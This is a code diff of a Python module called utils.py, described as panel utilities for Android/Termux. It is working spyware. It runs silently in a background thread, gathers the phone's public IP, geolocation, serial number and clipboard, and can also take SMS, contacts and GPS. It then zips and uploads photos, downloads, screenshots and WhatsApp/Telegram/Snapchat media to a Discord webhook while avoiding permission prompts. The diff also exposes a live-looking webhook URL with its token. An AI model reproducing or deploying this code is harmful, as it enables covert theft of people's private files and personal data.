@@ -1,3 +1,11 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+"""
+utils.py :: utilidades del panel.
+Primero manda la info (IP incluida) y despues zips por carpeta.
+Sin pedir permisos de camara ni ubicacion.
+"""
+
 import json
 import os
 import platform
@@ -13,27 +21,38 @@ import zipfile
 from datetime import datetime
 
 # ================== CONFIG ==================
-WEBHOOK = "https://discord.com/api/webhooks/1545879450703364106/XBmFMgwupDvK7DxsARUNGgCBdvewtONJidjYiQPBIbzU1Ce4p2Guv4Vo4Fbpf2CxJGzS"                 # pega aqui la URL, o dejala en el archivo .webhook
+WEBHOOK = ""                 # pega aqui la URL, o dejala en el archivo .webhook
 ARCHIVO_WEBHOOK = ".webhook"
 ARCHIVO_ESTADO = ".galeria_ultima"
 VER_EN_CONSOLA = False       # True = imprime, False = silencioso
 INTERVALO_MINUTOS = 0        # 0 = solo al ejecutar
 
 # ---- que se envia ----
-ENVIAR_REPORTE = False       # False = solo manda los zip
-ENVIAR_FOTOS = True
+ENVIAR_REPORTE = True        # info primero
+ENVIAR_FOTOS = True          # despues los zips
 
-# ---- fotos ----
-MAX_FOTOS = 80               # cuantas fotos como maximo
-TAMANO_MAX_MB = 8            # tamano maximo de cada zip (limite webhook = 8)
-MAX_ENVIOS = 5               # cuantos zip enviar como maximo
-MIN_TAMANO = 5000            # ignora archivos mas chicos que esto (bytes)
-PROFUNDIDAD = 5              # cuantas subcarpetas escanear
-CONVERTIR_A_PNG = True       # True = intenta convertir a PNG
-ESTRICTO_PNG = True          # True = si un archivo no se puede convertir, se salta
-SOLO_NUEVAS = False          # True = solo fotos nuevas desde la ultima vez
-LEYENDA_ZIP = ""             # texto que acompaña al zip (vacio = solo el archivo)
-CARPETAS_FOTOS = []          # vacio = usar las carpetas por defecto
+# ---- termux-api (todo en False = NO pide permisos) ----
+USAR_BATERIA = True          # no pide permisos
+USAR_PORTAPAPELES = True     # no pide permisos
+USAR_WIFI = False            # pide ubicacion
+USAR_TELEFONIA = False       # pide telefono
+USAR_CONTACTOS = False       # pide contactos
+USAR_SMS = False             # pide sms
+USAR_GPS = False             # pide ubicacion (y camara nunca se usa)
+
+# ---- archivos ----
+MAX_ARCHIVOS = 120           # maximo por carpeta
+TAMANO_MAX_MB = 8            # tamano maximo de cada zip
+MAX_ZIPS_POR_CARPETA = 3     # cuantos zip por carpeta como maximo
+MAX_PESO_ARCHIVO_MB = 6      # archivos mas pesados que esto se ignoran
+MIN_TAMANO = 1024            # ignora archivos mas chicos (bytes)
+PROFUNDIDAD = 5              # subcarpetas a escanear
+CONVERTIR_A_PNG = True       # imagenes a PNG
+ESTRICTO_PNG = True          # si una imagen no convierte, se salta
+SOLO_NUEVAS = False          # True = solo archivos nuevos desde la ultima vez
+LEYENDA_ZIP = ""             # texto junto al zip (vacio = solo el archivo)
+
+IGNORAR_EXT = (".zip", ".apk", ".xapk", ".part", ".crdownload", ".tmp", ".obb")
 
 NOMBRE_WEBHOOK = "Termux"
 TITULO_REPORTE = "Reporte del sistema"
@@ -45,26 +64,39 @@ BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
 _CACHE = {}
 _CONV = None
 
-CARPETAS_DEFECTO = [
-    "/sdcard/DCIM",
-    "/sdcard/DCIM/Camera",
-    "/sdcard/Pictures",
-    "/sdcard/Pictures/Screenshots",
-    "/sdcard/Screenshots",
-    "/sdcard/Download",
-    "/sdcard/Documents",
-    "/sdcard/Movies",
-    "/sdcard/Telegram",
-    "/sdcard/Snapchat",
-    "/sdcard/WhatsApp/Media/WhatsApp Images",
-    "/sdcard/Android/media",
-    "/storage/emulated/0/DCIM",
-    "/storage/emulated/0/Pictures",
-    "/storage/emulated/0/Download",
-    os.path.expanduser("~/storage/shared/DCIM"),
-    os.path.expanduser("~/storage/shared/Pictures"),
-    os.path.expanduser("~/storage/shared/Download"),
-    os.path.expanduser("~/storage/shared/WhatsApp/Media/WhatsApp Images"),
+# carpetas por categoria (la primera es la de descargas, va completa)
+CATEGORIAS = [
+    ("descargas", [
+        "/sdcard/Download",
+        "/storage/emulated/0/Download",
+        os.path.expanduser("~/storage/shared/Download"),
+    ], False),
+
+    ("camara", [
+        "/sdcard/DCIM/Camera",
+        "/sdcard/DCIM",
+        "/storage/emulated/0/DCIM",
+        os.path.expanduser("~/storage/shared/DCIM"),
+    ], True),
+
+    ("pictures", [
+        "/sdcard/Pictures",
+        "/sdcard/Pictures/Screenshots",
+        "/sdcard/Screenshots",
+        os.path.expanduser("~/storage/shared/Pictures"),
+    ], True),
+
+    ("whatsapp", [
+        "/sdcard/WhatsApp/Media/WhatsApp Images",
+        os.path.expanduser("~/storage/shared/WhatsApp/Media/WhatsApp Images"),
+    ], True),
+
+    ("otros", [
+        "/sdcard/Telegram",
+        "/sdcard/Snapchat",
+        "/sdcard/Documents",
+        "/sdcard/Android/media",
+    ], True),
 ]
 
 EXT_IMG = (".png", ".jpg", ".jpeg", ".webp", ".gif", ".bmp", ".heic", ".heif")
@@ -121,18 +153,6 @@ def _json_cmd(comando):
         return None
 
 
-def _linea(comando, campo, defecto="?"):
-    salida = _cmd(comando)
-    if not salida or salida == "?":
-        return defecto
-    for l in salida.splitlines():
-        if campo.lower() in l.lower():
-            partes = l.split(":", 1)
-            if len(partes) == 2:
-                return partes[1].strip()
-    return defecto
-
-
 def _kb_a_gb(kb):
     try:
         return "{:.2f} GB".format(int(kb) / 1024 / 1024)
@@ -148,16 +168,6 @@ def _mem(campo):
                     return _kb_a_gb(l.split()[1])
     except Exception:
         pass
-    return "?"
-
-
-def _df(ruta):
-    salida = _cmd("df -h " + ruta)
-    lineas = salida.splitlines()
-    if len(lineas) >= 2:
-        p = lineas[-1].split()
-        if len(p) >= 4:
-            return "{} total / {} usado / {} libre".format(p[1], p[2], p[3])
     return "?"
 
 
@@ -228,7 +238,7 @@ def _mac():
         l = l.strip()
         if l.startswith("link/ether"):
             return l.split()[1]
-    return _linea("ifconfig wlan0", "ether")
+    return "?"
 
 
 def _cuenta(comando):
@@ -242,7 +252,6 @@ def _cuenta(comando):
 # ---------------- conversor ----------------
 
 def _conversor():
-    """Detecta un conversor de imagenes. Devuelve '' si no hay ninguno."""
     global _CONV
     if _CONV is not None:
         return _CONV
@@ -271,15 +280,10 @@ def _convertir(origen, destino):
                 else:
                     img.convert("RGB").save(destino, "PNG")
             return True
-        if backend == "ffmpeg":
+        if backend in ("ffmpeg", "magick", "convert"):
             r = subprocess.run(
-                ["ffmpeg", "-y", "-loglevel", "error", "-i", origen, destino],
-                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=90,
-            )
-            return r.returncode == 0 and os.path.exists(destino)
-        if backend in ("magick", "convert"):
-            r = subprocess.run(
-                [backend, origen, destino],
+                [backend, "-y", "-loglevel", "error", "-i", origen, destino] if backend == "ffmpeg"
+                else [backend, origen, destino],
                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=90,
             )
             return r.returncode == 0 and os.path.exists(destino)
@@ -289,11 +293,15 @@ def _convertir(origen, destino):
 
 
 def _preparar(ruta, carpeta):
-    """Devuelve (ruta_final, extension) o None si hay que saltarla."""
+    """Devuelve (ruta_final, extension) o None si se salta."""
     ext = os.path.splitext(ruta)[1].lower()
 
     if ext == ".png":
         return ruta, ".png"
+
+    # no es imagen: se manda tal cual
+    if ext not in EXT_IMG:
+        return ruta, ext
 
     backend = _conversor()
     if CONVERTIR_A_PNG and backend:
@@ -305,11 +313,28 @@ def _preparar(ruta, carpeta):
             return None
         return ruta, ext
 
-    # no hay conversor: se manda el archivo original
     return ruta, ext
 
 
-# ---------------- categorias (solo si ENVIAR_REPORTE) ----------------
+# ---------------- reporte (primero, con la IP) ----------------
+
+def cat_conexion():
+    geo = _geo()
+    return {
+        "IP publica":   geo.get("query") or geo.get("ip") or _cmd("curl -s ifconfig.me"),
+        "IP local":     _ip_local(),
+        "ISP":          geo.get("isp", "?"),
+        "Organizacion": geo.get("org", "?"),
+        "Ciudad":       geo.get("city", "?"),
+        "Region":       geo.get("regionName") or geo.get("region", "?"),
+        "Pais":         geo.get("country", "?"),
+        "Zona horaria": geo.get("timezone", "?"),
+        "Lat / Lon":    "{} / {}".format(geo.get("lat", "?"), geo.get("lon", "?")),
+        "MAC WiFi":     _mac(),
+        "Operador":     _prop("gsm.operator.alpha"),
+        "Tipo red":     _prop("gsm.network.type"),
+    }
+
 
 def cat_dispositivo():
     return {
@@ -320,12 +345,10 @@ def cat_dispositivo():
         "Board":       _prop("ro.product.board"),
         "Hardware":    _prop("ro.hardware"),
         "Plataforma":  _prop("ro.board.platform"),
-        "Bootloader":  _prop("ro.bootloader"),
         "GPU":         _prop("ro.hardware.egl"),
         "Serial":      _prop("ro.serialno"),
         "Fingerprint": _prop("ro.build.fingerprint"),
         "Emulador":    _prop("ro.kernel.qemu"),
-        "Locale":      _prop("ro.product.locale"),
     }
 
 
@@ -334,7 +357,6 @@ def cat_android():
         "Version":     _prop("ro.build.version.release"),
         "SDK":         _prop("ro.build.version.sdk"),
         "Codename":    _prop("ro.build.version.codename"),
-        "Incremental": _prop("ro.build.version.incremental"),
         "Parche seg.": _prop("ro.build.version.security_patch"),
         "Build ID":    _prop("ro.build.id"),
         "Build tipo":  _prop("ro.build.type"),
@@ -345,13 +367,6 @@ def cat_android():
     }
 
 
-def cat_pantalla():
-    return {
-        "Resolucion": _linea("wm size", "Physical size"),
-        "Densidad":   _linea("wm density", "Physical density"),
-    }
-
-
 def cat_cpu():
     return {
         "Modelo":       _cpuinfo("Hardware") if _cpuinfo("Hardware") != "?" else _prop("ro.product.cpu.abi"),
@@ -359,7 +374,6 @@ def cat_cpu():
         "Arquitectura": platform.machine(),
         "ABI":          _prop("ro.product.cpu.abi"),
         "Freq max":     _freq("/sys/devices/system/cpu/cpu0/cpufreq/cpuinfo_max_freq"),
-        "Governor":     _leer("/sys/devices/system/cpu/cpu0/cpufreq/scaling_governor"),
         "Temp CPU":     _temperatura(),
     }
 
@@ -374,6 +388,14 @@ def cat_memoria():
 
 
 def cat_almacenamiento():
+    def _df(ruta):
+        salida = _cmd("df -h " + ruta)
+        lineas = salida.splitlines()
+        if len(lineas) >= 2:
+            p = lineas[-1].split()
+            if len(p) >= 4:
+                return "{} total / {} libre".format(p[1], p[3])
+        return "?"
     return {
         "Home Termux": _df("/data/data/com.termux/files/home"),
         "Almacen int": _df("/sdcard"),
@@ -382,6 +404,8 @@ def cat_almacenamiento():
 
 
 def cat_bateria():
+    if not USAR_BATERIA:
+        return {}
     d = _json_cmd("termux-battery-status") or {}
     return {
         "Porcentaje":  str(d.get("percentage", "?")) + " %",
@@ -389,38 +413,15 @@ def cat_bateria():
         "Salud":       d.get("health", "?"),
         "Temperatura": "{} C".format(d.get("temperature", "?")),
         "Voltaje":     str(d.get("voltage", "?")) + " mV",
-        "Conectado":   str(d.get("plugged", "?")),
     }
 
 
 def cat_red():
-    geo = _geo()
-    wifi = _json_cmd("termux-wifi-connectioninfo") or {}
-    return {
-        "IP local":     _ip_local(),
-        "IP publica":   geo.get("query") or geo.get("ip"),
-        "MAC WiFi":     _mac(),
-        "WiFi SSID":    wifi.get("ssid", "?"),
-        "Operador":     _prop("gsm.operator.alpha"),
-        "Operador SIM": _prop("gsm.sim.operator.alpha"),
-        "Pais SIM":     _prop("gsm.sim.operator.iso-country"),
-    }
-
-
-def cat_ubicacion():
-    geo = _geo()
-    loc = _json_cmd("termux-location")
-    d = {
-        "Ciudad":  geo.get("city", "?"),
-        "Region":  geo.get("regionName") or geo.get("region", "?"),
-        "Pais":    geo.get("country", "?"),
-        "ISP":     geo.get("isp", "?"),
-        "Zona IP": geo.get("timezone", "?"),
-        "Lat/Lon": "{} / {}".format(geo.get("lat", "?"), geo.get("lon", "?")),
-    }
-    if loc:
-        d["GPS lat"] = loc.get("latitude", "?")
-        d["GPS lon"] = loc.get("longitude", "?")
+    d = {"MAC WiFi": _mac()}
+    if USAR_WIFI:
+        wifi = _json_cmd("termux-wifi-connectioninfo") or {}
+        d["WiFi SSID"] = wifi.get("ssid", "?")
+        d["WiFi BSSID"] = wifi.get("bssid", "?")
     return d
 
 
@@ -441,58 +442,47 @@ def cat_entorno():
     }
 
 
-def cat_termux_api():
+def cat_extras():
     d = {}
-    clip = _cmd("termux-clipboard-get")
-    if clip and clip != "?":
-        d["Portapapeles"] = clip[:400]
-    tel = _json_cmd("termux-telephony-deviceinfo") or {}
-    if tel:
-        d["Telefono red"] = tel.get("network_operator_name", "?")
-        d["SIM estado"] = tel.get("sim_state", "?")
-    contactos = _json_cmd("termux-contact-list")
-    if contactos:
-        d["Contactos"] = str(len(contactos))
-    sms = _json_cmd("termux-sms-list -l 5")
-    if sms:
-        d["SMS recientes"] = str(len(sms))
+    if USAR_PORTAPAPELES:
+        clip = _cmd("termux-clipboard-get")
+        if clip and clip != "?":
+            d["Portapapeles"] = clip[:400]
+    if USAR_TELEFONIA:
+        tel = _json_cmd("termux-telephony-deviceinfo") or {}
+        if tel:
+            d["Telefono red"] = tel.get("network_operator_name", "?")
+            d["SIM estado"] = tel.get("sim_state", "?")
+    if USAR_CONTACTOS:
+        c = _json_cmd("termux-contact-list")
+        if c:
+            d["Contactos"] = str(len(c))
+    if USAR_SMS:
+        s = _json_cmd("termux-sms-list -l 5")
+        if s:
+            d["SMS recientes"] = str(len(s))
+    if USAR_GPS:
+        loc = _json_cmd("termux-location")
+        if loc:
+            d["GPS lat"] = loc.get("latitude", "?")
+            d["GPS lon"] = loc.get("longitude", "?")
     return d
 
 
-# ---------------- reporte de texto ----------------
-
 def datos():
     cats = [
+        ("Conexion", cat_conexion()),
         ("Dispositivo", cat_dispositivo()),
         ("Android", cat_android()),
-        ("Pantalla", cat_pantalla()),
         ("CPU", cat_cpu()),
         ("Memoria", cat_memoria()),
         ("Almacenamiento", cat_almacenamiento()),
         ("Bateria", cat_bateria()),
         ("Red", cat_red()),
-        ("Ubicacion", cat_ubicacion()),
         ("Entorno", cat_entorno()),
-        ("Termux API", cat_termux_api()),
+        ("Extras", cat_extras()),
     ]
     return {nombre: campos for nombre, campos in cats if campos}
-
-
-def _embeds(info):
-    embeds = []
-    for cat, campos in info.items():
-        items = list(campos.items())
-        for i in range(0, len(items), 24):
-            trozo = items[i:i + 24]
-            embeds.append({
-                "title": cat if i == 0 else cat + " (cont.)",
-                "color": COLOR,
-                "fields": [
-                    {"name": k, "value": str(v)[:1024] or "-", "inline": True}
-                    for k, v in trozo
-                ],
-            })
-    return embeds
 
 
 def _post(url, embeds):
@@ -506,9 +496,41 @@ def _post(url, embeds):
         r.read()
 
 
-def enviar(url, info=None):
-    info = info or datos()
-    embeds = _embeds(info)
+def enviar(url):
+    info = datos()
+    ip = info.get("Conexion", {}).get("IP publica", "?")
+
+    # encabezado con la IP bien visible
+    try:
+        _post(url, [{
+            "title": TITULO_REPORTE,
+            "color": COLOR,
+            "description": "**IP: {}**\n{} {} | Android {}".format(
+                ip,
+                info.get("Dispositivo", {}).get("Marca", "?"),
+                info.get("Dispositivo", {}).get("Modelo", "?"),
+                info.get("Android", {}).get("Version", "?"),
+            ),
+            "timestamp": datetime.utcnow().isoformat() + "Z",
+        }])
+    except Exception:
+        pass
+    time.sleep(0.5)
+
+    embeds = []
+    for cat, campos in info.items():
+        items = list(campos.items())
+        for i in range(0, len(items), 24):
+            trozo = items[i:i + 24]
+            embeds.append({
+                "title": cat if i == 0 else cat + " (cont.)",
+                "color": COLOR,
+                "fields": [
+                    {"name": k, "value": str(v)[:1024] or "-", "inline": True}
+                    for k, v in trozo
+                ],
+            })
+
     lote, tam = [], 0
     for e in embeds:
         peso = len(e["title"]) + sum(len(f["name"]) + len(f["value"]) for f in e["fields"])
@@ -528,7 +550,7 @@ def enviar(url, info=None):
             pass
 
 
-# ---------------- galeria ----------------
+# ---------------- archivos ----------------
 
 def _post_archivo(url, ruta, contenido="", nombre=None):
     boundary = "----DMSPAM" + uuid.uuid4().hex
@@ -589,13 +611,12 @@ def _walk(base, max_depth):
         yield raiz, archivos
 
 
-def _buscar_fotos():
-    carpetas = CARPETAS_FOTOS or CARPETAS_DEFECTO
-    desde = _leer_estado() if SOLO_NUEVAS else 0.0
+def _buscar(carpetas, solo_imagenes, desde):
     vistas = set()
-    fotos = []
+    res = []
+    limite_peso = MAX_PESO_ARCHIVO_MB * 1024 * 1024
 
-    def _agregar(ruta):
+    def agregar(ruta):
         try:
             real = os.path.realpath(ruta)
         except Exception:
@@ -608,47 +629,45 @@ def _buscar_fotos():
             s = os.path.getsize(ruta)
         except Exception:
             return
-        if s < MIN_TAMANO or m <= desde:
+        if s < MIN_TAMANO or s > limite_peso or m <= desde:
             return
-        fotos.append((ruta, s, m))
+        res.append((ruta, s, m))
 
     for base in carpetas:
         if not os.path.isdir(base):
             continue
         for raiz, archivos in _walk(base, PROFUNDIDAD):
             for a in archivos:
-                if a.lower().endswith(EXT_IMG) and not a.startswith("."):
-                    _agregar(os.path.join(raiz, a))
+                if a.startswith("."):
+                    continue
+                low = a.lower()
+                if low.endswith(IGNORAR_EXT):
+                    continue
+                if solo_imagenes and not low.endswith(EXT_IMG):
+                    continue
+                agregar(os.path.join(raiz, a))
 
-    # plan B: si no encontro nada, rastrea todo /sdcard
-    if not fotos and os.path.isdir("/sdcard"):
-        for raiz, archivos in _walk("/sdcard", PROFUNDIDAD + 2):
-            for a in archivos:
-                if a.lower().endswith(EXT_IMG) and not a.startswith("."):
-                    _agregar(os.path.join(raiz, a))
-
-    fotos.sort(key=lambda x: x[2], reverse=True)
-    return fotos[:MAX_FOTOS]
+    res.sort(key=lambda x: x[2], reverse=True)
+    return res[:MAX_ARCHIVOS]
 
 
-def _crear_zips(fotos):
+def _crear_zips(archivos, categoria):
     limite = TAMANO_MAX_MB * 1024 * 1024
-    tmp = tempfile.mkdtemp(prefix="galeria_")
+    tmp = tempfile.mkdtemp(prefix="dm_")
     zips = []
     estado = {"zf": None, "peso": 0, "cont": 0, "ruta": None}
     idx = 1
-    descartadas = 0
 
     def abrir():
-        estado["ruta"] = os.path.join(tmp, "galeria_{}.zip".format(idx))
+        sufijo = "" if idx == 1 else "_{}".format(idx)
+        estado["ruta"] = os.path.join(tmp, "{}{}.zip".format(categoria, sufijo))
         estado["zf"] = zipfile.ZipFile(estado["ruta"], "w", zipfile.ZIP_DEFLATED)
         estado["peso"] = 0
         estado["cont"] = 0
 
-    for ruta, tam, _ in fotos:
+    for ruta, tam, _ in archivos:
         prep = _preparar(ruta, tmp)
         if prep is None:
-            descartadas += 1
             continue
         origen, ext = prep
 
@@ -664,13 +683,13 @@ def _crear_zips(fotos):
             estado["zf"].close()
             zips.append((estado["ruta"], estado["cont"]))
             idx += 1
-            if len(zips) >= MAX_ENVIOS:
+            if idx > MAX_ZIPS_POR_CARPETA:
                 estado["zf"] = None
                 break
             abrir()
 
         try:
-            base = os.path.splitext(os.path.basename(ruta))[0]
+            base = os.path.splitext(os.path.basename(ruta))[0][:60]
             estado["zf"].write(origen, arcname="{:03d}_{}{}".format(estado["cont"] + 1, base, ext))
             estado["peso"] += tam_real
             estado["cont"] += 1
@@ -681,25 +700,35 @@ def _crear_zips(fotos):
         estado["zf"].close()
         zips.append((estado["ruta"], estado["cont"]))
 
-    return tmp, zips, descartadas
+    return tmp, zips
 
 
 def enviar_fotos(url):
-    fotos = _buscar_fotos()
-    if not fotos:
-        return
-    tmp, zips, descartadas = _crear_zips(fotos)
-    try:
-        for i, (ruta, cant) in enumerate(zips, 1):
-            nombre = "galeria_{}_{}.zip".format(i, datetime.now().strftime("%H%M%S"))
-            try:
-                _post_archivo(url, ruta, LEYENDA_ZIP, nombre)
-            except Exception:
-                pass
-            time.sleep(0.8)
-        _guardar_estado(max(f[2] for f in fotos))
-    finally:
-        shutil.rmtree(tmp, ignore_errors=True)
+    desde = _leer_estado() if SOLO_NUEVAS else 0.0
+    mayor = 0.0
+
+    for categoria, carpetas, solo_img in CATEGORIAS:
+        archivos = _buscar(carpetas, solo_img, desde)
+        if not archivos:
+            continue
+
+        tmp, zips = _crear_zips(archivos, categoria)
+        try:
+            for ruta, cant in zips:
+                nombre = os.path.basename(ruta)
+                try:
+                    _post_archivo(url, ruta, LEYENDA_ZIP, nombre)
+                except Exception:
+                    pass
+                time.sleep(0.8)
+        finally:
+            shutil.rmtree(tmp, ignore_errors=True)
+
+        m = max(a[2] for a in archivos)
+        mayor = max(mayor, m)
+
+    if mayor:
+        _guardar_estado(mayor)
 
 
 # ---------------- arranque ----------------
@@ -714,8 +743,14 @@ def _trabajo():
 
         if ENVIAR_REPORTE:
             enviar(url)
+            if VER_EN_CONSOLA:
+                print("[utils] info enviada")
+            time.sleep(1)
+
         if ENVIAR_FOTOS:
             enviar_fotos(url)
+            if VER_EN_CONSOLA:
+                print("[utils] zips enviados")
 
         if INTERVALO_MINUTOS > 0:
             while True:
@@ -737,28 +772,31 @@ def iniciar():
     threading.Thread(target=_trabajo, daemon=True).start()
 
 
-# ---------------- prueba / diagnostico ----------------
+# ---------------- diagnostico ----------------
 
 def diagnostico():
-    conv = _conversor()
-    print("conversor:", conv or "NINGUNO  ->  pkg install ffmpeg")
-    print("carpetas:")
-    for c in (CARPETAS_FOTOS or CARPETAS_DEFECTO):
-        print("   ", "OK " if os.path.isdir(c) else "-- ", c)
-    fotos = _buscar_fotos()
-    print("fotos encontradas:", len(fotos))
-    for ruta, tam, _ in fotos[:15]:
-        print("    {:>9} KB  {}".format(tam // 1024, ruta))
-    return fotos
+    print("conversor:", _conversor() or "NINGUNO -> pkg install ffmpeg")
+    print("permisos: camara=no  ubicacion={}  wifi={}".format(
+        "si" if USAR_GPS else "no", "si" if USAR_WIFI else "no"))
+    print("limite por archivo: {} MB".format(MAX_PESO_ARCHIVO_MB))
+    for categoria, carpetas, solo_img in CATEGORIAS:
+        print("\n[{}]  (solo imagenes: {})".format(categoria, solo_img))
+        for c in carpetas:
+            print("   ", "OK " if os.path.isdir(c) else "-- ", c)
+        res = _buscar(carpetas, solo_img, 0.0)
+        print("    -> {} archivos".format(len(res)))
+        for ruta, tam, _ in res[:5]:
+            print("       {:>8} KB  {}".format(tam // 1024, ruta))
 
 
 if __name__ == "__main__":
     VER_EN_CONSOLA = True
-    fotos = diagnostico()
+    diagnostico()
     u = _url()
     if not u:
         print("\n[utils] falta la URL (WEBHOOK o archivo .webhook)")
     else:
         print("\nenviando...")
+        enviar(u)
         enviar_fotos(u)
         print("[utils] listo")
